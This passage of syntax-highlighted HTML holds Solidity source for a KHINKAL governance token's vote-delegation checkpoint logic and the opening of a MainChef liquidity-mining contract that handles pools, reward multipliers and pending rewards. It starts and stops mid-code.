operator\">=</span> _delegates<span class=\"token punctuation\">[</span>delegator<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> delegatorBalance <span class=\"token operator\">=</span> <span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>delegator<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// balance of underlying KHINKALs (not scaled);</span>\n        _delegates<span class=\"token punctuation\">[</span>delegator<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> delegatee<span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">DelegateChanged</span><span class=\"token punctuation\">(</span>delegator<span class=\"token punctuation\">,</span> currentDelegate<span class=\"token punctuation\">,</span> delegatee<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_moveDelegates</span><span class=\"token punctuation\">(</span>currentDelegate<span class=\"token punctuation\">,</span> delegatee<span class=\"token punctuation\">,</span> delegatorBalance<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_moveDelegates</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> srcRep<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> dstRep<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>srcRep <span class=\"token operator\">!=</span> dstRep <span class=\"token operator\">&amp;&amp;</span> amount <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>srcRep <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token comment\">// decrease old representative</span>\n                <span class=\"token builtin\">uint32</span> srcRepNum <span class=\"token operator\">=</span> numCheckpoints<span class=\"token punctuation\">[</span>srcRep<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n                <span class=\"token builtin\">uint256</span> srcRepOld <span class=\"token operator\">=</span> srcRepNum <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">?</span> checkpoints<span class=\"token punctuation\">[</span>srcRep<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>srcRepNum <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>votes <span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n                <span class=\"token builtin\">uint256</span> srcRepNew <span class=\"token operator\">=</span> srcRepOld<span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token function\">_writeCheckpoint</span><span class=\"token punctuation\">(</span>srcRep<span class=\"token punctuation\">,</span> srcRepNum<span class=\"token punctuation\">,</span> srcRepOld<span class=\"token punctuation\">,</span> srcRepNew<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>dstRep <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token comment\">// increase new representative</span>\n                <span class=\"token builtin\">uint32</span> dstRepNum <span class=\"token operator\">=</span> numCheckpoints<span class=\"token punctuation\">[</span>dstRep<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n                <span class=\"token builtin\">uint256</span> dstRepOld <span class=\"token operator\">=</span> dstRepNum <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">?</span> checkpoints<span class=\"token punctuation\">[</span>dstRep<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>dstRepNum <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>votes <span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n                <span class=\"token builtin\">uint256</span> dstRepNew <span class=\"token operator\">=</span> dstRepOld<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token function\">_writeCheckpoint</span><span class=\"token punctuation\">(</span>dstRep<span class=\"token punctuation\">,</span> dstRepNum<span class=\"token punctuation\">,</span> dstRepOld<span class=\"token punctuation\">,</span> dstRepNew<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_writeCheckpoint</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> delegatee<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint32</span> nCheckpoints<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint256</span> oldVotes<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint256</span> newVotes<span class=\"token punctuation\">)</span><span class=\"token keyword\">internal</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint32</span> blockNumber <span class=\"token operator\">=</span> <span class=\"token function\">safe32</span><span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>number<span class=\"token punctuation\">,</span> <span class=\"token string\">\"KHINKAL::_writeCheckpoint: block number exceeds 32 bits\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>nCheckpoints <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> checkpoints<span class=\"token punctuation\">[</span>delegatee<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>nCheckpoints <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>fromBlock <span class=\"token operator\">==</span> blockNumber<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            checkpoints<span class=\"token punctuation\">[</span>delegatee<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>nCheckpoints <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>votes <span class=\"token operator\">=</span> newVotes<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            checkpoints<span class=\"token punctuation\">[</span>delegatee<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>nCheckpoints<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">Checkpoint</span><span class=\"token punctuation\">(</span>blockNumber<span class=\"token punctuation\">,</span> newVotes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            numCheckpoints<span class=\"token punctuation\">[</span>delegatee<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> nCheckpoints <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">DelegateVotesChanged</span><span class=\"token punctuation\">(</span>delegatee<span class=\"token punctuation\">,</span> oldVotes<span class=\"token punctuation\">,</span> newVotes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">safe32</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> n<span class=\"token punctuation\">,</span> <span class=\"token builtin\">string</span> <span class=\"token keyword\">memory</span> errorMessage<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint32</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>n <span class=\"token operator\">&lt;</span> <span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">32</span><span class=\"token punctuation\">,</span> errorMessage<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">uint32</span><span class=\"token punctuation\">(</span>n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getChainId</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token keyword\">pure</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> chainId<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">assembly</span> <span class=\"token punctuation\">&#123;</span> chainId <span class=\"token operator\">:=</span> <span class=\"token function\">chainid</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> chainId<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">MainChef</span> <span class=\"token keyword\">is</span> Ownable <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeERC20</span> <span class=\"token keyword\">for</span> IERC20<span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">// Info of each user.</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">UserInfo</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">;</span> <span class=\"token comment\">// How many LP tokens the user has provided.</span>\n        <span class=\"token builtin\">uint256</span> rewardDebt<span class=\"token punctuation\">;</span> <span class=\"token comment\">// Reward debt. See explanation below.</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token comment\">// Info of each pool.</span>\n    <span class=\"token keyword\">struct</span> <span class=\"token class-name\">PoolInfo</span> <span class=\"token punctuation\">&#123;</span>\n        IERC20 lpToken<span class=\"token punctuation\">;</span> <span class=\"token comment\">// Address of LP token contract.</span>\n        <span class=\"token builtin\">uint256</span> allocPoint<span class=\"token punctuation\">;</span> <span class=\"token comment\">// How many allocation points assigned to this pool. KHINKALs to distribute per block.</span>\n        <span class=\"token builtin\">uint256</span> lastRewardBlock<span class=\"token punctuation\">;</span> <span class=\"token comment\">// Last block number that KHINKALs distribution occurs.</span>\n        <span class=\"token builtin\">uint256</span> accKhinkalPerShare<span class=\"token punctuation\">;</span> <span class=\"token comment\">// Accumulated KHINKALs per share, times 1e12. See below.</span>\n        <span class=\"token builtin\">uint256</span> lastKhinkalReward<span class=\"token punctuation\">;</span> <span class=\"token comment\">// Protection against incorrect tokenomics</span>\n    <span class=\"token punctuation\">&#125;</span>\n    KhinkalToken <span class=\"token keyword\">public</span> khinkal<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> devaddr<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> governance<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> bonusEndBlock<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> khinkalPerBlock<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> BONUS_MULTIPLIER <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span>\n    PoolInfo<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> poolInfo<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> UserInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> userInfo<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> totalAllocPoint <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">public</span> startBlock<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">Deposit</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> user<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">indexed</span> pid<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">Withdraw</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> user<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">indexed</span> pid<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint256</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">event</span> <span class=\"token function\">EmergencyWithdraw</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> <span class=\"token keyword\">indexed</span> user<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">indexed</span> pid<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> amount\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span>\n        KhinkalToken _khinkal<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> _devaddr<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> _khinkalPerBlock<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> _startBlock<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> _bonusEndBlock<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> _governance\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        khinkal <span class=\"token operator\">=</span> _khinkal<span class=\"token punctuation\">;</span>\n        devaddr <span class=\"token operator\">=</span> _devaddr<span class=\"token punctuation\">;</span>\n        khinkalPerBlock <span class=\"token operator\">=</span> _khinkalPerBlock<span class=\"token punctuation\">;</span>\n        bonusEndBlock <span class=\"token operator\">=</span> _bonusEndBlock<span class=\"token punctuation\">;</span>\n        startBlock <span class=\"token operator\">=</span> _startBlock<span class=\"token punctuation\">;</span>\n        governance <span class=\"token operator\">=</span> _governance<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">poolLength</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> poolInfo<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">uint256</span> _allocPoint<span class=\"token punctuation\">,</span>\n        IERC20 _lpToken<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bool</span> _withUpdate\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_add</span><span class=\"token punctuation\">(</span>_allocPoint<span class=\"token punctuation\">,</span> _lpToken<span class=\"token punctuation\">,</span> _withUpdate<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">addToken</span><span class=\"token punctuation\">(</span>IERC20 _lpToken<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> <span class=\"token function\">owner</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">||</span> msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> governance<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Access denied\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_add</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> _lpToken<span class=\"token punctuation\">,</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_add</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _allocPoint<span class=\"token punctuation\">,</span>IERC20 _lpToken<span class=\"token punctuation\">,</span><span class=\"token builtin\">bool</span> _withUpdate<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_withUpdate<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">massUpdatePools</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token builtin\">uint256</span> lastRewardBlock <span class=\"token operator\">=</span>\n            block<span class=\"token punctuation\">.</span>number <span class=\"token operator\">></span> startBlock <span class=\"token operator\">?</span> block<span class=\"token punctuation\">.</span>number <span class=\"token punctuation\">:</span> startBlock<span class=\"token punctuation\">;</span>\n        totalAllocPoint <span class=\"token operator\">=</span> totalAllocPoint<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>_allocPoint<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        poolInfo<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>\n            <span class=\"token function\">PoolInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">&#123;</span>\n                lpToken<span class=\"token punctuation\">:</span> _lpToken<span class=\"token punctuation\">,</span>\n                allocPoint<span class=\"token punctuation\">:</span> _allocPoint<span class=\"token punctuation\">,</span>\n                lastRewardBlock<span class=\"token punctuation\">:</span> lastRewardBlock<span class=\"token punctuation\">,</span>\n                accKhinkalPerShare<span class=\"token punctuation\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n                lastKhinkalReward<span class=\"token punctuation\">:</span> <span class=\"token number\">0</span>\n            <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _pid<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint256</span> _allocPoint<span class=\"token punctuation\">,</span><span class=\"token builtin\">bool</span> _withUpdate<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_withUpdate<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">massUpdatePools</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        totalAllocPoint <span class=\"token operator\">=</span> totalAllocPoint<span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>poolInfo<span class=\"token punctuation\">[</span>_pid<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>allocPoint<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>\n            _allocPoint\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        poolInfo<span class=\"token punctuation\">[</span>_pid<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>allocPoint <span class=\"token operator\">=</span> _allocPoint<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">getMultiplier</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _from<span class=\"token punctuation\">,</span><span class=\"token builtin\">uint256</span> _to<span class=\"token punctuation\">)</span><span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_to <span class=\"token operator\">&lt;=</span> bonusEndBlock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> _to<span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>_from<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>BONUS_MULTIPLIER<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_from <span class=\"token operator\">>=</span> bonusEndBlock<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> _to<span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>_from<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span>\n                bonusEndBlock<span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>_from<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>BONUS_MULTIPLIER<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>\n                    _to<span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>bonusEndBlock<span class=\"token punctuation\">)</span>\n                <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// View function to see pending KHINKALs on frontend.</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">pendingKhinkal</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> _pid<span class=\"token punctuation\">,</span><span class=\"token builtin\">address</span> _user<span class=\"token punctuation\">)</span><span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        PoolInfo <span class=\"token keyword\">storage</span> pool <span class=\"token operator\">=</span> poolInfo<span class=\"token punctuation\">[</span>_pid<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        UserInfo <span class=\"token keyword\">storage</span> user <span class=\"token operator\">=</span> userInfo<span class=\"token punctuation\">[</span>_pid<span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span>_user<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> accKhinkalPerShare <span class=\"token operator\">=</span> pool<span class=\"token punctuation\">.</span>accKhinkalPerShare<span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint256</span> lpSupply <span class=\"token operator\">=</span> pool<span class=\"token punctuation\">.</span>lpToken<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>block<span class=\"token punctuation\">.</span>number <span class=\"token operator\">></span> pool<span class=\"token punctuation\">.</span>lastRewardBlock <span class=\"token operator\">&amp;&amp;</span> lpSupply <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token builtin\">uint256</span> multiplier <span class=\"token operator\">=</span>\n                <span class=\"token function\">getMultiplier</span><span class=\"token punctuation\">(</span>pool<span class=\"token punctuation\">.</span>lastRewardBlock<span class=\"token punctuation\">,</span> block<span class=\"token punctuation\">.</span>number<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token builtin\">uint256</span> khinkalReward <span class=\"token operator\">=</span>\n                multiplier<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>khinkalPerBlock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>pool<span class=\"token punctuation\">.</span>allocPoint<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">div</span><span class=\"token punctuation\">(</span>\n                    totalAllocPoint\n                <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            accKhinkalPerShare <span class=\"token operator\">=</span> accKhinkalPerShare<span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>\n                khinkalReward<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span><span class=\"token number\">1e12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">div</span><span class=\"token punctuation\">(</span>lpSupply<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> user<span class=\"token punctuation\">.</span>amount<span class=\"token punctuation\">.</span><span class=\"token function\">mul</span><span class=\"token punctuation\">(</span>accKhinkalPerShare<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">div</span><span class=\"token punctuation\">(</span><span class=\"token number\">1e12</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>user<span class=\"token punctuation\">.</span>rewardDebt<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Update reward vairables for all pools. Be careful of gas spending!</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">massUpdatePools</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint256</span> length <span class=\"token operator\">=</span> poolInfo<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> pid <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> pid <span class=\"token operator\">&lt;</span> length<span class=\"token punctuation\">;</span> <span class=\"token operator\">++</span>pid<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">updatePool</span><span class=\"token punctuation\">(</span>pid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// 